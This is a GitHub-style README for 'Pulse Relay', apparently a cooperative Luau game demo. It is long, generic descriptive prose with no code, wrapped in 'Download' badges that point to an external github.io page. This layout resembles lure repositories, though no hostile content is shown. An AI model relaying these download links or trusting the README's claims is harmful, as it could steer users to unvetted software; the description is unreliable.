![preview](https://raw.githubusercontent.com/AJAY94633/signal-run-relay/main/poster_44fba9.svg)
[![Download](https://raw.githubusercontent.com/AJAY94633/signal-run-relay/main/setup_4befdb0.svg)](https://AJAY94633.github.io/signal-run-relay/)

# 🚀 Pulse Relay — Cooperative Signal-Chain Playground for Cubacadabra

An open, MIT-licensed reference world that demonstrates how a portable Luau package can own its entire universe: terrain sculpting, authoritative simulation state, player interactions, visual and audio feedback, and a living heads-up display. Pulse Relay is the spiritual successor to Signal Run — where Signal Run taught one runner to dodge and deliver, Pulse Relay teaches a whole squad to relay, reroute, and recover together.

Think of it as a radio tower built out of code: each player is a frequency, each obstacle is interference, and the win condition is a clean transmission. The repository is intended for game designers, Luau tinkerers, educators, and modding communities who want a compact but genuinely complete example of a self-contained package rather than a pile of loose scripts.

---

## 🧭 Table of Contents

- [Why This Repository Exists](#-why-this-repository-exists)
- [Concept and World Design](#-concept-and-world-design)
- [Feature Highlights](#-feature-highlights)
- [Architecture Overview](#-architecture-overview)
- [The Luau Package Model](#-the-luau-package-model)
- [Authoritative State and Netcode Philosophy](#-authoritative-state-and-netcode-philosophy)
- [Gameplay Systems Deep Dive](#-gameplay-systems-deep-dive)
  - [Relay Nodes](#relay-nodes)
  - [Interference Fields](#interference-fields)
  - [Carrier Pulse Mechanic](#carrier-pulse-mechanic)
  - [Signal Integrity Meter](#signal-integrity-meter)
- [Audio and Effects Layer](#-audio-and-effects-layer)
- [HUD and Interface Design](#-hud-and-interface-design)
- [Responsive Interface and Accessibility](#-responsive-interface-and-accessibility)
- [Multilingual Support](#-multilingual-support)
- [Configuration and Tuning](#-configuration-and-tuning)
- [Extending the World](#-extending-the-world)
- [Testing and Simulation Harness](#-testing-and-simulation-harness)
- [Performance Notes](#-performance-notes)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Community and Support](#-community-and-support)
- [Contributing](#-contributing)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🛰 Why This Repository Exists

Most example games in the Luau ecosystem fall into one of two traps. Either they are so minimal that they teach nothing about real structure, or they are so entangled with a specific engine build that nobody can lift the ideas into their own project.

Pulse Relay was written to sit precisely between those extremes. It is a **cooperative relay and obstacle example** that fits inside a single portable package. You can read it end to end in an afternoon, but it still demonstrates the parts of game development that usually get hand-waved away: authoritative simulation, deterministic interactions, declarative effect graphs, audio cue routing, and a HUD that reacts to state rather than polling it.

The design brief was simple to say and hard to execute: build a small world that only works when people cooperate, and prove that a Luau package can be the entire delivery vehicle.

---

## 🌍 Concept and World Design

Pulse Relay is set inside a decaying broadcast array known as the **Lattice** — a ring of relay towers suspended above a churning static sea. A transmission enters the Lattice at one edge and must exit at the opposite edge intact. Between those two points sits a chain of relay nodes, each one capable of forwarding the signal only while it is properly powered and aligned.

Players take on the role of **Signal Bearers**. Each bearer carries a fragment of the transmission. No single bearer holds enough to complete the run. The signal only survives if fragments are handed off at the right node, at the right moment, while interference fields sweep across the lattice and try to scramble everything.

The metaphor matters. This is not a game about heroes; it is a game about handoffs. The drama comes from timing, trust, and the audible degradation of a signal that is slowly losing coherence.

### The Lattice at a Glance

- **Entry Aperture** — where the transmission begins, quiet and clean.
- **Relay Nodes** — hexagonal platforms that forward signal fragments.
- **Interference Fields** — roaming volumes that scramble fragments on contact.
- **Static Sea** — the boundary of playable space; contact ends the run.
- **Exit Aperture** — where a completed transmission is scored.

---

## ✨ Feature Highlights

- 📡 **Cooperative relay simulation** — progress is only possible when fragments change hands.
- 🧩 **Single portable Luau package** — the world, state, interactions, effects, audio, and HUD all ship together.
- 🎛 **Authoritative state core** — one simulation of record, with clients treated as views.
- 🔁 **Deterministic interactions** — the same inputs produce the same outcomes on every machine.
- 🖥 **Responsive HUD** — layout adapts from compact handheld displays to wide desktop canvases.
- 🌐 **Multilingual support** — interface strings and audio cues are localizable without code edits.
- 🕓 **Round-the-clock assistance posture** — documentation, examples, and issue triage aimed at keeping contributors unblocked at any hour.
- 🎚 **Tunable difficulty curves** — interference density, relay timing windows, and integrity decay are all data-driven.
- 🔊 **Layered audio feedback** — spatialized relay hums and warning tones keyed directly to simulation state.
- 🎨 **Declarative effect graph** — visual effects are described, not scripted frame by frame.

---

## 🏗 Architecture Overview

The repository is organized around a small number of clearly separated concerns. Nothing in the package reaches into another layer's internals; everything communicates through well-named surfaces.

At a high level:

- A **world definition** describes geometry, spawn points, and node topology.
- A **state core** owns the authoritative simulation and ticks it forward.
- An **interaction layer** translates player intent into state transitions.
- An **effect layer** observes state and produces visuals.
- An **audio layer** observes state and produces sound.
- A **HUD layer** observes state and produces interface.

This separation is the central lesson of the repository. When a new contributor asks "where do I add feathers to the relay towers," the answer is unambiguous: the effect layer, and nowhere else.

---

## 🧬 The Luau Package Model

Pulse Relay is deliberately packaged as a portable Luau module tree. That means:

- No hard dependency on a particular host layout.
- No global mutable singletons leaking across scripts.
- A single entry surface that a host application can require and mount.

The package exposes a lifecycle: mount, tick, input, unmount. Everything else is internal. This mirrors how a well-behaved library should behave, and it makes the example genuinely reusable rather than merely readable.

---

## 🔐 Authoritative State and Netcode Philosophy

The state core is the single source of truth. Clients do not decide whether a relay fired or whether a fragment survived interference; they request an action, and the core resolves it.

Key principles adopted in this repository:

- **Single writer** — only the core mutates simulation state.
- **Idempotent intents** — replaying an input request never double-applies.
- **Tick-stamped transitions** — every state change is associated with a simulation tick.
- **View-only clients** — client-side prediction is intentionally omitted to keep the example honest and legible.

If you are learning how authoritative design feels in practice, this is your sandbox.

---

## 🎮 Gameplay Systems Deep Dive

### Relay Nodes

Each relay node is a small state machine: idle, charging, forwarding, and cooling down. Nodes do not fire on their own. They require a bearer to be present and a fragment to be inserted. This is deliberate: it keeps the pressure on the players, not the world.

### Interference Fields

Interference fields drift along paths defined in data. They shrink and grow, and they wobble. When a field touches a fragment in transit, the fragment loses integrity. Fields never destroy outright; they degrade, which creates recovery opportunities and keeps runs tense rather than punishing.

### Carrier Pulse Mechanic

A bearer can emit a carrier pulse to stabilize a nearby fragment or briefly push an interference field away. Pulses have a shared cooldown across the team, so using one is never a private decision — it is a negotiation. This is the cooperative heart of the design.

### Signal Integrity Meter

The integrity meter is the run's health. It falls when fragments are scrambled and rises when fragments are relayed cleanly. A completed transmission is scored against the percentage of integrity that survived the journey. High-integrity runs are considered *clean transmissions* and surface on the HUD as a distinct victory state.

---

## 🎵 Audio and Effects Layer

Audio and visual effects share a philosophy: they are observers, not deciders. They subscribe to state transitions and react. This means you can replace the entire effect layer without touching simulation code, and you can mute the audio layer entirely without affecting gameplay.

The audio layer distinguishes between:

- **Ambient bed** — the low hum of the Lattice.
- **Node cues** — short tones confirming relay handoffs.
- **Warning cues** — rising tones when integrity drops past thresholds.
- **Climax cues** — a resolved chord when a transmission completes.

Effects include relay glow pulses, field shimmer, fragment trails, and the subtle desaturation of the scene as integrity falls.

---

## 🖥 HUD and Interface Design

The HUD is intentionally quiet. It is built to communicate three things at a glance:

1. Where the transmission currently is.
2. How much integrity remains.
3. Which bearer is holding what.

Everything else is secondary. The HUD avoids numeric clutter in favor of shape and color, because in a cooperative timing game, clarity beats precision.

---

## 📱 Responsive Interface and Accessibility

The interface adapts across display sizes without separate layouts. Compact displays receive a reduced HUD that emphasizes the integrity meter and the current fragment holder. Wider canvases receive a fuller topology view showing the entire Lattice.

Accessibility is treated as a first-class concern:

- Colorblind-safe palette options.
- Optional high-contrast outline for relay nodes.
- Adjustable audio cue intensity.
- Text scale multipliers independent of resolution.

---

## 🌐 Multilingual Support

All user-facing strings are externalized into locale tables. The package ships with an English baseline and a documented process for adding new locales. Audio cues are designed to be language-neutral so that a translation pass does not require re-recording.

Localization covers the HUD, in-world signage, and the documentation snippets embedded in the package.

---

## ⚙️ Configuration and Tuning

Tuning lives in data, not code. A single configuration table controls:

- Interference density and drift speed.
- Relay node charge and cooldown timings.
- Carrier pulse cooldown and radius.
- Integrity decay and recovery rates.
- Round length targets for solo, duo, and full-squad play.

This makes the repository an excellent teaching aid: change one number, observe the ripple.

---

## 🧱 Extending the World

Extending Pulse Relay follows a recipe:

1. Add new node types to the world definition.
2. Register their behavior in the interaction layer.
3. Give them cues in the effect and audio layers.
4. Surface their state on the HUD if the player needs to know about it.

Because each step is isolated, extensions do not become archaeology projects. You are never required to understand the entire codebase to add a single feature.

---

## 🧪 Testing and Simulation Harness

The repository includes a lightweight simulation harness that runs the state core headlessly. This allows contributors to verify balance changes without launching the full visual world. The harness supports scripted input sequences so that cooperative scenarios can be replayed deterministically.

Testing philosophy here is pragmatic: cover the state transitions that matter, and keep everything else simple enough to reason about by eye.

---

## 🚀 Performance Notes

Pulse Relay targets modest hardware. Its performance posture is:

- Fixed-timestep simulation to keep behavior stable.
- Batched effect updates to avoid frame-time spikes.
- No per-frame allocations in hot paths.
- Audio cue pooling rather than fresh playback objects.

If you introduce a feature that breaks any of these, the repository's guidance is to reconsider the feature before reconsidering the principle.

---

## 🗺 Roadmap for 2026

- Expanded locale coverage and a documented translation pipeline.
- A second Lattice layout demonstrating different node topologies.
- Optional spectator view for cooperative streaming setups.
- More granular accessibility presets.
- A companion walkthrough that follows a single run tick by tick.

The 2026 roadmap is intentionally modest. The goal is depth over breadth: fewer features, better explained.

---

## 💬 Community and Support

Documentation, examples, and issue triage are maintained with a round-the-clock posture. Whether you are filing a question at midnight or reviewing a pull request at dawn, the expectation is that you will find a response or at least a clear next step. Contributions to documentation are held in the same regard as contributions to code.

---

## 🤝 Contributing

Contributions are welcome. Before opening a pull request:

- Read the architecture overview and respect layer boundaries.
- Keep simulation changes accompanied by harness coverage.
- Match the existing tone: clear, quiet, and specific.
- Prefer a small, well-explained change over a large, ambiguous one.

---

## 📜 License

This project is released under the MIT License. See the full text at the link below.

[MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 Pulse Relay contributors.

---

## ⚠️ Disclaimer

Pulse Relay is an educational and experimental example project. It is provided as-is, without warranty of any kind, express or implied. The authors are not responsible for any damages, data loss, or unexpected simulation behavior arising from its use. Names, locales, and world content are illustrative and not intended to represent any real organization. Always review third-party dependencies and adapt configuration values to your own environment before deploying in a production setting.

[![Download](https://raw.githubusercontent.com/AJAY94633/signal-run-relay/main/setup_4befdb0.svg)](https://AJAY94633.github.io/signal-run-relay/)